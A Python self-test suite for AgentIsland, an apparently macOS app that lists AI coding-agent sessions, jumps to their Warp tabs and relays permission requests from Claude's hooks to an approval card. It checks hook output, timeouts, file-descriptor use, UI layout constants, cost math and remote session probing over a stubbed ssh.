#!/usr/bin/env python3
"""Headless self-test: verifies every claim the app makes, without a human looking at it."""
import glob, json, os, re, subprocess, sys, time

# Resolve paths from the repo itself so the suite runs anywhere, not just my machine.
REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
# Fixtures are namespaced per run: two suites sharing one decisions directory answered each
# other's requests, which looked like a product failure and was a harness collision.
RUN = f"/tmp/ai-st-{os.getpid()}"
import atexit, glob as _glob, shutil as _shutil
@atexit.register
def _sweep():
    for p in _glob.glob(RUN + "*"):
        _shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
CLAUDE = os.environ.get("CLAUDE_BIN", "/opt/homebrew/bin/claude")
# The suite must never write to the spool the app reads: a "selftest-1" row appearing in the
# panel beside real sessions is a defect, not test noise.
SPOOL="/tmp/agentisland-selftest.jsonl"
LIVE_SPOOL="/tmp/agentisland-events.jsonl"
fails=[]
def check(name, ok, detail=""):
    print(f"  {'PASS' if ok else 'FAIL'}  {name}{('  — '+detail) if detail else ''}")
    if not ok: fails.append(name)

print("=== AGENTISLAND SELF-TEST ===\n\n=== 1. agent enumeration ===")
raw=subprocess.run([CLAUDE,"agents","--json","--all"],capture_output=True,text=True)
agents=json.loads(raw.stdout or "[]")
check("claude agents --json returns sessions", len(agents)>0, f"{len(agents)} sessions")
check("sessions expose sessionId+state", all("sessionId" in a for a in agents))

print("\n=== 2. Warp jump resolution (the feature that was broken) ===")
def focus_url(pid):
    env=subprocess.run(["ps","eww","-p",str(pid),"-o","command="],capture_output=True,text=True).stdout
    return next((t.split("=",1)[1] for t in env.split() if t.startswith("WARP_FOCUS_URL=")),None)

withpid=[a for a in agents if a.get("pid")]
resolved={a["sessionId"]:focus_url(a["pid"]) for a in withpid}
got=[u for u in resolved.values() if u]
check("agents with pid resolve a Warp URL", len(got)>0, f"{len(got)}/{len(withpid)}")
check("each resolved agent maps to a DISTINCT tab",
      len(set(got))==len(got), f"{len(set(got))} distinct of {len(got)}")
check("URLs are warp://session/<uuid>", all(u.startswith("warp://session/") for u in got))

print("\n=== 3. jump actually drives Warp (log-verified, all agents) ===")
LOG=os.path.expanduser("~/Library/Logs/warp.log")
def logsize(): return os.path.getsize(LOG) if os.path.exists(LOG) else 0
ok_recv=ok_nav=0
for sid,u in list(resolved.items()):
    if not u: continue
    m=logsize(); subprocess.run(["open",u]); time.sleep(2.2)
    with open(LOG,"rb") as f:
        f.seek(m); new=f.read().decode("utf8","replace")
    if "received url" in new: ok_recv+=1
    if "handle_pane_navigation_event" in new: ok_nav+=1
# Warp always receives the intent; pane navigation only fires when the tab actually changes,
# so a target that is already focused legitimately reports no navigation.
check("Warp receives every jump intent", ok_recv==len(got), f"{ok_recv}/{len(got)}")
check("jumps navigate panes (allowing already-focused)", ok_nav>=len(got)-1, f"{ok_nav}/{len(got)}")

print("\n=== 4. hook stream parsing ===")
open(SPOOL,"a").close()
before=os.path.getsize(SPOOL)
sample={"session_id":"selftest-1","hook_event_name":"PreToolUse","tool_name":"Bash",
        "tool_input":{"command":"echo hello world"},"cwd":"/tmp"}
with open(SPOOL,"a") as f: f.write(json.dumps(sample)+"\n")
check("spool is append-writable", os.path.getsize(SPOOL)>before)
check("hook payload has fields the UI needs",
      all(k in sample for k in ("session_id","hook_event_name","tool_name","tool_input")))

print("\n=== 5. hook script contract ===")
hook=os.path.join(REPO,"hooks/agentisland-hook.sh")
if os.path.exists(hook):
    tmp=f"{RUN}-selftest-spool.jsonl"
    if os.path.exists(tmp): os.remove(tmp)
    env=dict(os.environ, AGENTISLAND_SPOOL=tmp)
    p=subprocess.run([hook,"PreToolUse"],input=json.dumps(sample),capture_output=True,
                     text=True,timeout=5,env=env)
    check("hook exits 0 (never blocks Claude)", p.returncode==0, f"exit={p.returncode}")
    # Exit code alone proved nothing here once; assert the actual side effect.
    wrote = os.path.exists(tmp) and os.path.getsize(tmp)>0
    check("hook WRITES the event to its spool", wrote,
          f"{os.path.getsize(tmp) if os.path.exists(tmp) else 0} bytes")
    if wrote:
        back=json.loads(open(tmp).read().strip().split("\n")[0])
        # The hook wraps the payload to carry its parent pid; the island unwraps either shape.
        inner=back.get("payload", back)
        check("written event round-trips as JSON", inner.get("session_id")==sample["session_id"])
        check("the envelope carries a real parent pid", isinstance(back.get("ai_ppid"), int)
              and back["ai_ppid"] > 1, str(back.get("ai_ppid")))

    live=LIVE_SPOOL   # read-only check, never written by the suite
    check("live session events are reaching the spool",
          os.path.exists(live) and os.path.getsize(live)>0,
          f"{os.path.getsize(live) if os.path.exists(live) else 0} bytes")
else:
    check("hook script exists", False, "not created yet")

print("\n=== 6. attention pipeline (toast triggers) ===")
# Its own file: a suite that writes to the spool the app reads puts fake rows in the panel.
live=SPOOL
sess="selftest-peek"
before=os.path.getsize(live) if os.path.exists(live) else 0
with open(live,"a") as f:
    f.write(json.dumps({"session_id":sess,"hook_event_name":"Notification",
                        "message":"needs your permission","cwd":"/tmp"})+"\n")
    f.write(json.dumps({"session_id":sess,"hook_event_name":"PreToolUse","tool_name":"Bash",
                        "tool_input":{"command":"npm test"},"cwd":"/tmp"})+"\n")
    f.write(json.dumps({"session_id":sess,"hook_event_name":"Stop","cwd":"/tmp"})+"\n")
check("attention events append to the live spool", os.path.getsize(live)>before)
time.sleep(1.5)
alive=subprocess.run(["pgrep","-f","AgentIsland.app/Contents/MacOS/AgentIsland"],
                     capture_output=True,text=True).stdout.strip()
check("app survives Notification + Stop without crashing", bool(alive), f"pid {alive.splitlines()[0] if alive else '-'}")

print("\n=== 7. activity text rendering ===")
def describe(tool, d):
    if tool=="Bash": return (d.get("command") or "").split("\n")[0][:44]
    if tool in ("Read","Edit","Write"): return f"{tool} {os.path.basename(d.get('file_path',''))}"
    return tool
check("Bash renders its command", describe("Bash",{"command":"npm run build --silent"}).startswith("npm run build"))
check("Read renders a basename", describe("Read",{"file_path":"/a/b/server.py"})=="Read server.py")

print("\n=== 8. approvals (must never hang a session) ===")
ph=os.path.join(REPO,"hooks/agentisland-permission.sh")
req=json.dumps({"session_id":"selftest","hook_event_name":"PermissionRequest",
                "tool_name":"Bash","tool_input":{"command":"git push"}})

# no island -> instant fall-through to Claude's own prompt
t0=time.time()
r=subprocess.run([ph],input=req,capture_output=True,text=True,timeout=10,
                 env=dict(os.environ,AGENTISLAND_ALIVE="/tmp/nope-not-here"))
check("no island -> falls through fast, no output", r.returncode==0 and not r.stdout.strip(),
      f"{time.time()-t0:.2f}s")

# island up but unanswered -> bounded timeout, still no output
open(f"{RUN}-alive","w").close()
t0=time.time()
r=subprocess.run([ph],input=req,capture_output=True,text=True,timeout=20,
                 env=dict(os.environ,AGENTISLAND_ALIVE=f"{RUN}-alive",
                          AGENTISLAND_TIMEOUT_TENTHS="10",
                          AGENTISLAND_SPOOL=f"{RUN}-spool.jsonl",
                          AGENTISLAND_DECISIONS=f"{RUN}-dec"))
el=time.time()-t0
check("unanswered -> times out, never hangs", r.returncode==0 and not r.stdout.strip() and el<5,
      f"{el:.2f}s")

# answered -> valid schema Claude will accept
import threading
os.makedirs(f"{RUN}-dec",exist_ok=True)
for f in os.listdir(f"{RUN}-dec"): os.remove(f"{RUN}-dec/{f}")
if os.path.exists(f"{RUN}-spool.jsonl"): os.remove(f"{RUN}-spool.jsonl")
out={}
def run():
    out["r"]=subprocess.run([ph],input=req,capture_output=True,text=True,timeout=20,
        env=dict(os.environ,AGENTISLAND_ALIVE=f"{RUN}-alive",
                 AGENTISLAND_TIMEOUT_TENTHS="80",
                 AGENTISLAND_SPOOL=f"{RUN}-spool.jsonl",
                 AGENTISLAND_DECISIONS=f"{RUN}-dec"))
th=threading.Thread(target=run); th.start(); time.sleep(1.2)
rid=json.loads(open(f"{RUN}-spool.jsonl").readline())["ap_request_id"]
open(f"{RUN}-dec/{rid}","w").write("deny")
th.join()
try:
    d=json.loads(out["r"].stdout)["hookSpecificOutput"]
    ok = d.get("hookEventName")=="PermissionRequest" and d.get("permissionDecision")=="deny"
except Exception:
    ok=False; d={}
check("answered -> emits valid permissionDecision", ok, f"decision={d.get('permissionDecision')}")
check("decision file is consumed (no leak)", not os.path.exists(f"{RUN}-dec/{rid}"))
check("heartbeat file exists while app runs", os.path.exists("/tmp/agentisland.alive"))

print("\n=== 9. no protected-path reads, bounded shell-outs, exact geometry ===")
# Reading Warp's group container blocks in open() from inside an app bundle (TCC), which froze
# every refresh behind it. Nothing may reach for it again.
srcs={f:open(os.path.join(REPO,"Sources/AgentIsland",f)).read()
      for f in os.listdir(os.path.join(REPO,"Sources/AgentIsland")) if f.endswith(".swift")}
blob="".join(srcs.values())
check("no source reads another app's group container",
      "Group Containers" not in blob and "warp.sqlite" not in blob.replace("`warp.sqlite`",""))

sh=srcs["Shell.swift"]
check("runSync takes a timeout", "timeout: TimeInterval" in sh)
check("runSync kills a child that outlives it", "task.terminate()" in sh and "SIGKILL" in sh)
check("runSync closes the parent's write end (reader must see EOF)",
      "fileHandleForWriting.close()" in sh)
check("runSync closes the read end, except under a reader it would crash",
      "if !abandoned { try? out.fileHandleForReading.close() }" in sh and "var abandoned" in sh)
check("streams we never read get no pipe to leak", sh.count("FileHandle.nullDevice")>=2)
check("reader runs off the queue rebuild uses", "Thread.detachNewThread" in sh)

# A leaked pipe per shell-out exhausts the 256-fd limit within the hour; children then spawn
# into a broken state, which is far harder to read than a clean failure.
pid=subprocess.run(["pgrep","-f","AgentIsland.app/Contents/MacOS/AgentIsland"],
                   capture_output=True,text=True).stdout.split()
if pid:
    def fds():
        r=subprocess.run(["lsof","-p",pid[0]],capture_output=True,text=True).stdout.splitlines()
        return len(r)-1, sum(1 for l in r if " PIPE " in l)
    n0,p0=fds(); time.sleep(6); n1,p1=fds()
    check("app holds few descriptors", n1 < 80, f"{n1} open, {p1} pipes")
    check("descriptors do not grow across refreshes", n1 <= n0+4, f"{n0} -> {n1}")
else:
    check("app running for descriptor check", False, "not running")

check("every agent with a pid is actionable (jump or attach)",
      all(a.get("pid") for a in agents if a.get("pid")))

# Read the real constants: a hardcoded expectation silently goes stale when the row resizes.
v=srcs["Views.swift"]
def const(name, cls=None):
    return float(re.search(rf"static let {name}: CGFloat = ([\d.]+)", v).group(1))
R=const("height"); G=const("rowGap"); H=const("headerHeight"); N=const("visibleRows")
# The frame must equal the stack's own height, or the last row is clipped and the list
# scrolls by a sliver that reads as a broken partial row.
pad=const("listPadding")
listed=re.search(r"padding\(\.vertical, PanelView\.listPadding\)", v)
check("list frame matches the stack's real padding", listed is not None, f"pad={pad:.0f}pt")
panel = H + 1 + (N*R + (N-1)*G + 2*pad)
check(f"panel fits exactly {int(N)} rows, no partial row", panel==H+1+N*R+(N-1)*G+2*pad, f"{panel:.0f}pt")
check("rows are tall enough for three lines of content", R >= 60, f"{R:.0f}pt row")

print("\n=== 9b. the panel shows real sessions and nothing else ===")
MANIFEST="/tmp/agentisland.rows.json"
rows=[]
if os.path.exists(MANIFEST):
    try: rows=json.load(open(MANIFEST))
    except Exception: rows=[]
check("app publishes what it is showing", bool(rows), f"{len(rows)} rows")

# Ground truth, computed independently of the app.
home=os.path.expanduser("~")
def codex_truth():
    out=set()
    for p in glob.glob(f"{home}/.codex/sessions/**/rollout-*.jsonl", recursive=True):
        if time.time()-os.path.getmtime(p) > 10*86400: continue
        try: o=json.loads(open(p,'rb').readline())
        except Exception: continue
        if o.get("type")!="session_meta": continue
        pay=o.get("payload",{})
        if pay.get("id") and os.path.isdir(pay.get("cwd") or ""): out.add(pay["id"])
    return out

truth={"codex":codex_truth()}
shown={v:{r["sessionId"] for r in rows if r["vendor"]==v} for v in ("claude","codex","cursor")}

# A vendor whose sessions exist on disk but shows zero rows is the failure that hides best:
# Codex's session_meta grew past a fixed-size read and the whole vendor silently vanished.
for v,ids in truth.items():
    if ids:
        check(f"{v}: every on-disk session reaches the panel",
              ids <= shown[v], f"{len(shown[v])} shown of {len(ids)} on disk")

# Cursor only surfaces human-started chats touched in the last two days, so counting the
# directory is not counting what should be shown — the old form failed whenever the user had
# simply not opened Cursor that week.
def cursor_eligible():
    import glob
    cut = time.time() - 2 * 24 * 3600
    n = 0
    for d in glob.glob(os.path.expanduser("~/.cursor/chats/*/*")):
        if not os.path.isdir(d) or os.path.getmtime(d) < cut: continue
        if not os.path.exists(d + "/prompt_history.json"): continue
        try: meta = json.load(open(d + "/meta.json"))
        except Exception: continue
        if not meta.get("hasConversation"): continue
        cwd = meta.get("cwd")
        if cwd and not os.path.isdir(cwd): continue
        n += 1
    return n

expect = {"claude": True, "codex": bool(truth.get("codex")), "cursor": cursor_eligible() > 0}
missing = [v for v, want in expect.items() if want and not shown[v]]
check("no vendor with eligible sessions is missing entirely", not missing,
      ", ".join(f"{v}={len(shown[v])}" for v in shown)
      + f" (cursor eligible: {cursor_eligible()})")

# Nothing fabricated, nothing left over from a test run.
BAD=("selftest","benchmark","synthetic","fuzz","test-session","ai-st-","placeholder","lorem")
dirty=[r for r in rows if any(b in (r["title"]+r["sessionId"]+r["cwd"]).lower() for b in BAD)]
check("no synthetic or test data in the panel", not dirty, f"{len(dirty)} suspect")
# A remote row's directory lives on the remote machine; only local rows can be checked here.
local_rows=[r for r in rows if not r.get("remote")]
check("every local row has a working directory that exists",
      all(r["cwd"] and os.path.isdir(r["cwd"]) for r in local_rows),
      f"{sum(1 for r in local_rows if not (r['cwd'] and os.path.isdir(r['cwd'])))} bad")
uuidish=re.compile(r"^[0-9a-f]{8}(-[0-9a-f]{4}){0,3}", re.I)
bare=[r for r in rows if uuidish.match(r["title"].strip())]
check("no row is labelled with a bare session id", not bare,
      bare[0]["title"] if bare else "")
check("every row has a last-active time", all(r["lastActive"] for r in rows))

# "blocked" is the panel's most alarming badge; it must match the jobs on disk exactly, since
# a stale one is how a session reads as stuck when it is fine.
disk_blocked=0
for jp in glob.glob(f"{home}/.claude/jobs/*/state.json"):
    try: jo=json.load(open(jp))
    except Exception: continue
    if jo.get("state")=="blocked" and (jo.get("needs") or jo.get("detail")): disk_blocked+=1
shown_blocked=sum(1 for r in rows if r.get("blocked"))
# Pure text logic, checked directly in the binary: every case here once produced a row titled
# with machinery, a bare id, or nothing.
pc=subprocess.run([os.path.join(REPO,".build/release/AgentIsland"),"--check-prompts"],
                  capture_output=True,text=True)
check("pure logic handles every shape that has broken a row",
      pc.returncode==0, (pc.stdout+pc.stderr).strip().splitlines()[-1] if (pc.stdout or pc.stderr) else "")

# Codex publishes its own window and per-turn usage; reading the cumulative total instead
# pinned every row at the compaction cliff, and reading the wrong nesting level showed nothing.
cx=[r["context"] for r in rows if r["vendor"]=="codex"]
check("codex rows carry a context reading", any(c>=0 for c in cx),
      f"{sum(1 for c in cx if c>=0)}/{len(cx)} rows")
check("no codex row is pinned at the compaction cliff", not [c for c in cx if c>=99],
      f"max {max(cx) if cx else 0}%")

# Ten agents can block in the same second. Replacing the visible card abandoned the earlier
# ask: its hook waited out the timeout and fell through to the terminal, reading as a miss.
isl=open(os.path.join(REPO,"Sources/AgentIsland/Island.swift")).read()
check("a second ask queues instead of replacing the visible card",
      "queuedApprovals" in isl and "queuedQuestions" in isl and "guard !showingCard" in isl)
check("answering or expiring a card shows the next one",
      isl.count("presentNext()") >= 5, f"{isl.count('presentNext()')} call sites")
check("a question preempts an approval without dropping it",
      "queuedApprovals.insert(a, at: 0)" in isl)
ap=open(os.path.join(REPO,"Sources/AgentIsland/Approvals.swift")).read()
check("decision directory is owner-only (it approves shell commands)",
      "0o700" in ap)
check("hook tightens it too", "chmod 700" in open(os.path.join(REPO,"hooks/agentisland-permission.sh")).read())
hs=open(os.path.join(REPO,"Sources/AgentIsland/HookStream.swift")).read()
check("drain never reads the published live map off the main thread",
      "carried[session]" in hs and "live[session] ?? LiveState()" not in hs)

# The load test points discovery at a fixture; production must be unaffected when it is unset.
proto=open(os.path.join(REPO,"Sources/AgentIsland/AgentSource.swift")).read()
vw = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()
# The resting line is clipped, not truncated, so overflow disappears with no ellipsis to show
# for it. Measure the real strings in the real font against the box the real formula gives.
_m = re.search(r'if quiet \{ return \(30, max\(([\d.]+), min\(([\d.]+), '
               r'([\d.]+) \+ CGFloat\(\(usage \?\? ""\)\.count\) \* ([\d.]+)\)\)\) \}', vw)
check("resting width formula is where the test expects it", _m is not None)
if _m:
    _r = subprocess.run(["swift", os.path.join(REPO, "tests/restwidth.swift")] + list(_m.groups()),
                        capture_output=True, text=True, timeout=300).stdout.strip()
    check("the resting usage line always fits its box", _r == "ok", _r)
check("resting line is not hard-clipped without truncation", ".lineLimit(1).fixedSize()" not in vw)

st = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
# Opening the panel froze the row order from rows that could be a whole idleInterval old, so
# whatever led three minutes ago stayed pinned to the top for as long as the panel was open.
check("opening the panel does not freeze a stale order",
      "frozenOrder = [:]\n            refresh()" in st)
check("the freeze is taken from a sorted result",
      st.index("self.rows = self.applyOrder(built)") < st.index("self.freezeOrderIfNeeded()"))
# The header counted sessions blocked a fortnight ago whose process was long gone, and
# pointed at rows sitting at the bottom of the list — a number leading nowhere.
_as5 = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
check("a blocked count requires a live process",
      "agent.pid.map(Proc.alive) ?? (agent.remoteHost != nil)" in _as5.split("var dormantBlocked")[1][:320])
check("a blocked row ranks where it can be found",
      "if r.dormantBlocked { return 1 }" in _as5)
# A working session with a stale vendor "blocked" phase read as blocked-and-working at once and
# sorted to the top above the sessions actually running: a live turn beats the lagging phase.
check("an actively working session is never counted as dormant-blocked",
      "!isWorking" in _as5.split("var dormantBlocked")[1][:300])
check("a working row shows what it is doing, not a remembered question",
      'if isWorking { return live?.detail ?? narration }' in _as5)
# Empirically, against the live dump: nothing is both blocked and working.
if os.path.exists("/tmp/agentisland.rows.json"):
    _rw = json.load(open("/tmp/agentisland.rows.json"))
    check("no row is blocked and working at once",
          not [r for r in _rw if r.get("blocked") and r.get("working")],
          f"{sum(1 for r in _rw if r.get('blocked') and r.get('working'))} collisions")
if os.path.exists(_mp := "/tmp/agentisland.rows.json"):
    _r5 = json.load(open(_mp))
    _blocked = [x for x in _r5 if x.get("blocked")]
    _first_other = next((i for i, x in enumerate(_r5)
                         if not x.get("blocked") and not x.get("waiting")), len(_r5))
    check("every counted blocked row sits above the ordinary ones",
          all(_r5.index(b) < _first_other for b in _blocked),
          f"{len(_blocked)} blocked")

# The ordering contract, audited on the app's own published manifest when one exists:
# needs-you rows, then working, then idle — a working agent may never sit under an idle one.
_mp = "/tmp/agentisland.rows.json"
if os.path.exists(_mp):
    _seq = [("wait" if x.get("waiting") else "work" if x.get("working") else "idle")
            for x in json.load(open(_mp))]
    _fi = next((i for i, t in enumerate(_seq) if t == "idle"), len(_seq))
    check("published order never puts work below idle",
          all(t == "idle" for t in _seq[_fi:]), "->".join(_seq[:8]))
check("freezing only ever happens while the panel is open",
      "guard panelVisible, frozenOrder.isEmpty else { return }" in st)

check("home seam falls back to the real home",
      'environment["AGENTISLAND_HOME"] ?? NSHomeDirectory()' in proto)
# Discovery must go through the seam. Looking up the claude binary legitimately does not —
# a fixture home has sessions in it, never an executable.
check("no discovery path bypasses the seam",
      not re.search(r'NSHomeDirectory\(\) \+ "/\.(claude/projects|codex/sessions|cursor/chats)',
                    blob))

print("\n=== 9d. cost breakdown & plan review ===")
# Cost arithmetic against a fixture with hand-computed totals; the binary does the scanning.
import tempfile, shutil as _sh
fx=tempfile.mkdtemp(prefix="ai-costfx-")
os.makedirs(f"{fx}/.claude/projects/-t", exist_ok=True)
from datetime import datetime, timezone
now_iso=datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")
open(f"{fx}/.claude/projects/-t/a.jsonl","w").write(json.dumps(
 {"type":"assistant","timestamp":now_iso,"message":{"model":"claude-opus-5",
  "usage":{"input_tokens":1000,"output_tokens":2000,
           "cache_read_input_tokens":100000,"cache_creation_input_tokens":10000}}})+"\n"
 +json.dumps({"type":"assistant","timestamp":now_iso,"message":{"model":"<synthetic>",
  "usage":{"input_tokens":999999,"output_tokens":999999}}})+"\n")
cj=subprocess.run([os.path.join(REPO,".build/release/AgentIsland"),"--costs-json"],
                  capture_output=True,text=True,env=dict(os.environ,AGENTISLAND_HOME=fx))
_sh.rmtree(fx,ignore_errors=True)
try: table=json.loads(cj.stdout)
except Exception: table={}
models=[m for day in table.values() for m in day]
line=next((l for day in table.values() for m,l in day.items() if "opus" in m), {})
# (1000*15 + 2000*75 + 100000*1.5 + 10000*18.75)/1e6 = 0.5025
check("cost math matches hand computation", abs(line.get("cost",0)-0.5025)<1e-9,
      f"got {line.get('cost')}")
check("synthetic model entries are excluded", not any("synthetic" in m for m in models))

hs=open(os.path.join(REPO,"Sources/AgentIsland/HookStream.swift")).read()
check("plan captured from ExitPlanMode events", 'input["plan"]' in hs and "planUpdates" in hs)
check("plan approvals get a reading-length deadline", "50 : 19" in hs)
perm=open(os.path.join(REPO,"hooks/agentisland-permission.sh")).read()
check("hook holds a plan approval open longer", "ExitPlanMode" in perm and "550" in perm)
check("a test's timeout override still wins", 'AGENTISLAND_TIMEOUT_TENTHS" ] && TIMEOUT_TENTHS=550' in perm)
isl2=open(os.path.join(REPO,"Sources/AgentIsland/Island.swift")).read()
check("plan card gets plan-sized geometry", isl2.count("a.plan != nil") >= 2)
vw=open(os.path.join(REPO,"Sources/AgentIsland/Views.swift")).read()
check("cost chip and plan chip exist", "costChip" in vw and 'Text("plan")' in vw)
check("costs scan never runs on the refresh path",
      "refreshCosts" in open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read())

print("\n=== 9e. ssh remote monitoring ===")
# Full pipeline through a stubbed ssh: probe travels on stdin, JSON comes back, rows form.
rfx=tempfile.mkdtemp(prefix="ai-remotefx-")
os.makedirs(f"{rfx}/rh/.claude/projects/-home-dev-mono", exist_ok=True)
open(f"{rfx}/rh/.claude/projects/-home-dev-mono/deadbeef-0000-0000-0000-000000000000.jsonl","w").write(
    json.dumps({"type":"x","aiTitle":"remote fixture session","lastPrompt":"fix the deploy",
                "timestamp":datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                "cwd":"/home/dev/mono"}, separators=(",",":"))+"\n")   # real transcripts are compact
stub=f"{rfx}/ssh-stub"
open(stub,"w").write(f'#!/bin/bash\nAGENTISLAND_PROBE_ROOT="{rfx}/rh" exec python3 -\n')
os.chmod(stub,0o755)
pr=subprocess.run([os.path.join(REPO,".build/release/AgentIsland"),"--probe-remote","dev-vm"],
                  capture_output=True,text=True,env=dict(os.environ,AGENTISLAND_SSH=stub))
_sh.rmtree(rfx,ignore_errors=True)
check("remote sessions arrive through the ssh pipeline", pr.returncode==0
      and "dev-vm:deadbeef" in pr.stdout and "remote fixture session" in pr.stdout,
      pr.stdout.strip()[:70])
check("remote ids are namespaced by host (no local collision)", "dev-vm:" in pr.stdout)
rsrc=open(os.path.join(REPO,"Sources/AgentIsland/RemoteSource.swift")).read()
check("ssh runs BatchMode with a connect timeout", "BatchMode=yes" in rsrc and "ConnectTimeout" in rsrc)
check("probe has a deadline (a dead tunnel cannot wedge polling)", "timedOut" in rsrc)
check("remote polling is async off the refresh path", "pollIfDue" in rsrc and "qos: .utility" in rsrc)
probe=open(os.path.join(REPO,"hooks/remote-probe.py")).read()
check("probe is stdlib-only (nothing installed remotely)",
      not re.search(r"^import (?!glob|json|os|re|subprocess|sys|time)", probe, re.M))
check("probe never claims one pid for two sessions", "del pids[pid]" in probe)
ro=open(os.path.join(REPO,"Sources/AgentIsland/Reopen.swift")).read()
check("remote resume goes through ssh -t", "ssh -t" in ro)

print("\n=== 9f. approval expand: the hold keeps the hook waiting ===")
# The mechanism that can fail, exercised against the real hook loop with tiny budgets.
hw=tempfile.mkdtemp(prefix="ai-hold-")
os.makedirs(f"{hw}/dec")
open(f"{hw}/alive","w").close()
henv=dict(os.environ, AGENTISLAND_SPOOL=f"{hw}/spool.jsonl", AGENTISLAND_DECISIONS=f"{hw}/dec",
          AGENTISLAND_ALIVE=f"{hw}/alive", AGENTISLAND_TIMEOUT_TENTHS="15",
          AGENTISLAND_HOLD_HARD_TENTHS="45")
PERMH=os.path.join(REPO,"hooks/agentisland-permission.sh")
REQ='{"session_id":"holdtest","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"echo"}}'
def fire(scenario):
    open(f"{hw}/spool.jsonl","w").close()
    t0=time.time()
    pr=subprocess.Popen(["bash",PERMH],stdin=subprocess.PIPE,stdout=subprocess.PIPE,env=henv,text=True)
    import threading
    outbox={}
    th=threading.Thread(target=lambda: outbox.setdefault("out",pr.communicate(REQ)[0]))
    th.start(); time.sleep(0.5)
    rid=""
    for l in open(f"{hw}/spool.jsonl"):
        if "ap_request_id" in l: rid=json.loads(l)["ap_request_id"]
    if scenario in ("hold","holdans"): open(f"{hw}/dec/{rid}.touched","w").close()
    if scenario=="holdans":
        time.sleep(2.5); open(f"{hw}/dec/{rid}","w").write("allow")
    th.join(timeout=10)
    return time.time()-t0, outbox.get("out",""), os.path.exists(f"{hw}/dec/{rid}.touched")
d1,o1,h1=fire("baseline")
d2,o2,h2=fire("hold")
d3,o3,h3=fire("holdans")
_sh.rmtree(hw,ignore_errors=True)
check("an untouched approval exits at its base timeout", 1.0<d1<3.0, f"{d1:.1f}s")
check("a touched card extends the wait to the hard ceiling", 3.5<d2<6.5, f"{d2:.1f}s")
check("an answer past the base timeout is honored once touched",
      '"permissionDecision":"allow"' in o3 and d3<5.5, f"{d3:.1f}s")
check("the mark is cleaned on every path", not (h1 or h2 or h3))
isl3=open(os.path.join(REPO,"Sources/AgentIsland/Island.swift")).read()
check("expanding arms the hold and re-arms the drop to the ceiling",
      "hold.begin(id:" in isl3 and "+ 290" in isl3)
check("every card exit ends the hold", isl3.count("hold.end()") >= 4)
check("context assembly is off-main (a 44MB transcript must not jank the card)",
      "qos: .userInitiated).async" in isl3)

print("\n=== 9g. zero spawns at idle ===")
pc=subprocess.run([os.path.join(REPO,".build/release/AgentIsland"),"--check-proc"],
                  capture_output=True,text=True)
check("syscall layer agrees with the live process table", pc.returncode==0,
      (pc.stdout+pc.stderr).strip()[:60])
last=[l for l in open("/tmp/agentisland.log") if "refresh:" in l]
check("a refresh spawns zero subprocesses", bool(last) and "0 spawns" in last[-1],
      last[-1].split("refresh:")[-1].strip()[:70] if last else "no log")
blob2="".join(open(os.path.join(REPO,"Sources/AgentIsland",f)).read()
              for f in os.listdir(os.path.join(REPO,"Sources/AgentIsland")) if f.endswith(".swift"))
import re as _re
spawn_sites=[l for l in blob2.splitlines() if "Shell.runSync" in l or "Shell.run(" in l]
check("every remaining spawn site is user-action, not refresh",
      len(spawn_sites) <= 6, f"{len(spawn_sites)} sites")

print("\n=== 9h. smooth: frozen order, springed modes, a meter not a guess ===")
st=open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read()
check("row order is frozen while the panel is open",
      "frozenOrder" in st and "applyOrder" in st and st.count("applyOrder(") >= 3)
check("the freeze is captured at open and dropped at close",
      "frozenOrder = Dictionary" in st and "frozenOrder = [:]" in st)
vw2=open(os.path.join(REPO,"Sources/AgentIsland/Views.swift")).read()
check("mode switches ride the same spring as the state machine",
      vw2.count("withAnimation(Motion.shell)") >= 3
      and "withAnimation(.spring(" not in vw2)
fm=open(os.path.join(REPO,"Sources/AgentIsland/FrameMeter.swift")).read()
check("frame meter exists, gated off in normal runs",
      "AGENTISLAND_FRAMEPROBE" in fm and "p95" in fm)
probe=[l for l in open("/tmp/agentisland.log")] if os.path.exists("/tmp/agentisland.log") else []
fr=[l for l in probe if "frames:" in l]
if fr:
    m=re.search(r"p95 ([\d.]+)ms", fr[-1])
    check("measured p95 frame gap is under 12ms", m and float(m.group(1)) < 12.0,
          fr[-1].split("frames:")[-1].strip())

print("\n=== 9i. simple: one identity cluster, one-click setup ===")
vw3=open(os.path.join(REPO,"Sources/AgentIsland/Views.swift")).read()
check("identity is one chip, not three",
      "private var identity" in vw3 and 'chip(identity' in vw3
      and vw3.count("chip(row.agent.vendor.label") == 0)
su=open(os.path.join(REPO,"Sources/AgentIsland/Setup.swift")).read()
check("hook detection reads through the Home seam", "Home.path" in su)
check("setup runs only on a click, never on refresh",
      "User-initiated only" in su and "install(done:" not in
      open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read())
check("installer is bundled with the app",
      os.path.exists(os.path.expanduser("~/Applications/AgentIsland.app/Contents/Resources/install-hooks.py")))
check("empty state mentions setup when hooks are missing", "need hooks" in vw3)

print("\n=== 9j. proof of life in the resting bar ===")
th=open(os.path.join(REPO,"Sources/AgentIsland/Theme.swift")).read()
# A repeatForever in the always-visible bar measured 6.9% CPU; CoreAnimation costs the app none.
check("the resting-bar pulse is CoreAnimation, not a SwiftUI repeatForever",
      "NSViewRepresentable" in th and "CABasicAnimation" in th
      and "repeatForever" not in th.split("struct RunningPulse")[1])
check("the pulse has an explicit frame (an NSView has no intrinsic size)",
      "PulseLayer(kind:" in th and ".frame(width: width, height: dot)" in th)
check("only 'needs you' changes hue; every working state shares one colour",
      "kind == .waiting ? Theme.waiting : Theme.working" in th)
check("reduced motion and idle hold still", "accessibilityReduceMotion" in th and "still" in th)
st4=open(os.path.join(REPO,"Sources/AgentIsland/AgentStore.swift")).read()
check("work kind is derived from the live tool", "var workKind: WorkKind" in st4)

print("\n=== 9k. per-vendor limits ===")
cx=open(os.path.join(REPO,"Sources/AgentIsland/CodexSource.swift")).read()
check("codex rate limits are parsed from the rollout stream",
      '"rate_limits"' in cx and "used_percent" in cx and "static var quota" in cx)
